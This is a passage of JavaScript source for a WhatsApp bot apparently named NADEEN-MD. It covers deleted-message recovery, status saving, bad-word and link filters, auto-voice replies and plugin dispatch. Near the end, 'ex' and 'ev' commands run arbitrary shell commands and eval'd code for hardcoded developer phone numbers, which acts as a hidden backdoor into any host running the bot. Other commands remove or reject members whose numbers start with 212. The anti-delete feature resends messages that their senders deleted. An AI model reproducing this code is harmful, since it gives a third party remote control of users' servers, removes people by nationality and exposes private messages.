     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }else{
    const messagetext = originalMessage.message.extendedTextMessage.text;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
        conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
    }
    }
    
    quotedMessageRetrive()
           
    }else if(originalMessage.type === 'imageMessage') {
          async function imageMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.imageMessage.caption){
    const messageText = originalMessage.message.imageMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` })
    }else{
        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }       
        }
    imageMessageRetrive()
     
    }else if(originalMessage.type === 'videoMessage') {
          async function videoMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
    
    const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if(originalMessage.message.videoMessage.caption){
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    const messageText = originalMessage.message.videoMessage.caption;
    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
    
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` })
           }
    }else{
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
        const vData = originalMessage.message.videoMessage.fileLength
    const vTime = originalMessage.message.videoMessage.seconds;
    const fileDataMB = config.MAX_SIZE
    const fileLengthBytes = vData
    const fileLengthMB = fileLengthBytes / (1024 * 1024);
    const fileseconds = vTime
    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
    }
    }       
    }
    videoMessageRetrive()
    }else if(originalMessage.type === 'documentMessage') {
          async function documentMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    
        
    
    if(originalMessage.message.documentWithCaptionMessage){
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
     
    }else{
    
    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
    
    }
     }
    
    documentMessageRetrive()
    }else if(originalMessage.type === 'audioMessage') {
          async function audioMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.audioMessage){
    const audioq = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: audioq});
    
    }else{
    if(originalMessage.message.audioMessage.ptt === "true"){
    
    const pttt = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, ptt: 'true',fileName: `${m.id}.mp3` })	
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: pttt});
    
     }
      }
     }
    
    audioMessageRetrive()
    }else if(originalMessage.type === 'stickerMessage') {
          async function stickerMessageRetrive(){      var nameJpg = getRandom('');
    const ml = sms(conn, originalMessage)
                let buff =  await ml.download(nameJpg)
                let fileType = require('file-type');
                let type = fileType.fromBuffer(buff);
                await fs.promises.writeFile("./" + type.ext, buff);
    if(originalMessage.message.stickerMessage){
     
    //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
    
    }else{
    
    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
    
      }
     }
    
    stickerMessageRetrive()
             }
         
      } else {
        console.log('Original message not found for revocation.');
      }
    }
  
    if (mek.msg && mek.msg.type === 0) {
      handleMessageRevocation(mek);
    } else {//if(mek.message && mek.message.conversation && mek.message.conversation !== ''){
      handleIncomingMessage(mek);
    
        }
    
    }
    }	
    }


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////












//============================================================================================================================================================



  //==================================================================================================================================================================== 

//==================================================================================================================================================================
const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`)
if (config.ANTI_BAD  == "true"){
  if (!isAdmins && !isMe) {
  for (any in bad){
  if (body.toLowerCase().includes(bad[any])){  
    if (!body.includes('tent')) {
      if (!body.includes('docu')) {
        if (!body.includes('https')) {
  if (groupAdmins.includes(sender)) return 
  if (mek.key.fromMe) return   
  await conn.sendMessage(from, { delete: mek.key })  
  await conn.sendMessage(from , { text: '*Bad word detected..!*'})
await conn.groupParticipantsUpdate(from, [sender], 'remove')
 
  }}}}}}}

if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
    // if(!m.quoted) return reply("*Please Mention status*")
    const data = JSON.stringify(mek.message, null, 2);
    const jsonData = JSON.parse(data);
    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
    if(!isStatus) return

    const getExtension = (buffer) => {
        const magicNumbers = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
    };

    if(m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
    } else if(m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
            video: fs.readFileSync("./" + ext),
            mimetype: "video/mp4",
            fileName: `${m.id}.mp4`,
            caption: caption ,
            headerType: 4
        };
        await conn.sendMessage(from, buttonMessage,{
            quoted: mek
        });
    }
}
	   

 

//================================ Auto voice funtion=================================================================


if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body === "hii" || body === "Hii"){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/hi.mp3' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === 'owner' || body === 'nadeen' || body === 'kawuda haduwe' || body === 'made by' || body === 'kwd hduwe'){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/owner%20VOIC4E.mp3' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === 'gm' || body === 'moring' || body === 'Gm'||  body === 'good morning'){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/gm.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === 'ponnaya' || body === 'pakaya' || body === 'kariya'){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/Ponnaya(tbg).mp3' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === 'bs' || body === 'bye' || body === 'budusaranai' || body === 'yano' ){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/Bs(tbg).mp3' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === 'huththa' || body === 'htta' || body === 'hutta' || body === 'wesa' || body === 'puka' || body === 'ponna' || body === 'pako'){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/kunukarapa.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}

if(body === 'sex' || body === 'fuck' || body === 'hukanna' || body === 'ukamu' || body === 'hukamu'){
   
 if (config.AUTO_VOICE == 'true') {
  if (isMe) return;
await conn.sendPresenceUpdate('recording', from);
 await conn.sendMessage(from, { 
  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/kalalokaya.opus' }, 
  mimetype: 'audio/mpeg', 
  ptt: true 
}, { quoted: mek });

 }	
}











	    
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })

    try {
cmd.function(conn, mek, m, { from, prefix, l, isSudo, quoted, body, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
    } catch (e) {
console.error("[PLUGIN ERROR] ", e);
    }
  }
}
events.commands.map(async (command) => {
  if (body && command.on === "body") {
    command.function(conn, mek, m, { from, prefix, l, isSudo, quoted, isPre, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (mek.q && command.on === "text") {
    command.function(conn, mek, m, { from, l, quoted, body, isSudo, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    (command.on === "image" || command.on === "photo") &&
    mek.type === "imageMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, body, isCmd, command, isPre, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  } else if (
    command.on === "sticker" &&
    mek.type === "stickerMessage"
  ) {
    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, body, isCmd, command, args, isPre, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
  }
});

//============================================================================

if (config.ANTI_LINK == "true") {
  if (!isOwner && !isAdmins && isBotAdmins) {
    if (body.includes("chat.whatsapp.com","temu.com")) {
     await conn.sendMessage(from, { delete: mek.key });
      await conn.sendMessage(from, {
        text: `@${m.sender.split('@')[0]} , *🚫 Group links are not allowed!*`,
        mentions: [sender]
      });
    }
  }
}




// ANTI BOT OKKOMATAMA 3L1 DENNAM WADE 
 if (config.ANTI_BOT  == "true"){
  if ( isGroup && !isAdmins  && !isMe  && isBotAdmins ) {
  if ( mek.id.startsWith("BAE") ) {
await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
if ( config.ANTI_BOT && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
  }}
    if ( mek.id.startsWith("EVO") ) {
await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
if ( config.ANTI_BOT && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
      }
    }
if ( mek.id.startsWith("B1E") ) {
await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
if ( config.ANTI_BOT && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
      }
    }

if ( mek.id.startsWith("3L1") ) {
await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
if ( config.ANTI_BOT && isBotAdmins ) {
await conn.sendMessage(from, { delete: mek.key })
await conn.groupParticipantsUpdate(from,[sender], 'remove')
      }
    }

	  
  }
}
switch (command) {
  case 'jid':
    reply(from)
    break
  case 'device': {
    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)

    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
  }
    break
    case'ex':{
      if(senderNumber == 94755527010) {
  const { exec } = require("child_process")
  exec(q, (err, stdout) => {
    if (err) return reply(`-------\n\n` + err)
    if (stdout) {
        return reply(`-------\n\n` + stdout)
    }
})
      }
    }
    break
    case'apprv':{
      if(senderNumber == 94755527010) {
          let reqlist = await conn.groupRequestParticipantsList(from)
          for (let i=0;i<reqlist.length;i++) {
            if(reqlist[i].jid.startsWith("212")){
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "reject"
            )
            } else{
              await conn.groupRequestParticipantsUpdate(
                from,
                [reqlist[i].jid],
                "approve"
            )
            }
          }
        }
    }
    break
    case'212r':{
      if(senderNumber == 94755527010) {
        for (let i=0;i<participants.length;i++) {
          if(participants[i].id.startsWith("212")){
       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
      }
    }
  }
    }
    break
    case'rtf':{
console.log(dsa)
    }
    break
  case 'ev': {
    if(senderNumber == 94755527010 || senderNumber == 94711451319) {
    let code2 = q.replace("°", ".toString()");
    try {
let resultTest = await eval(code2);
if (typeof resultTest === "object") {
  reply(util.format(resultTest));
} else {
  reply(util.format(resultTest));
}
    } catch (err) {
reply(util.format(err));
    }
    ;
  }
  }
    break
  default:
}
    } catch (e) {
const isError = String(e)
console.log(isError)
    }
	  
  })
}
app.get("/", (req, res) => {
  res.send("📟 NADEEN-MD Working successfully!");
});
app.listen(port, () => console.log(`Nadeen-Md Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA();
}, 3000);


process.on("uncaughtException", function (err) {
  let e = String(err);
  if (e.includes("Socket connection timeout")) return;
  if (e.includes("rate-overlimit")) return;
  if (e.includes("Connection Closed")) return;
  if (e.includes("Value not found")) return;
  if (e.includes("Authentication timed out")) restart();
  console.log("Caught exception: ", err);
});
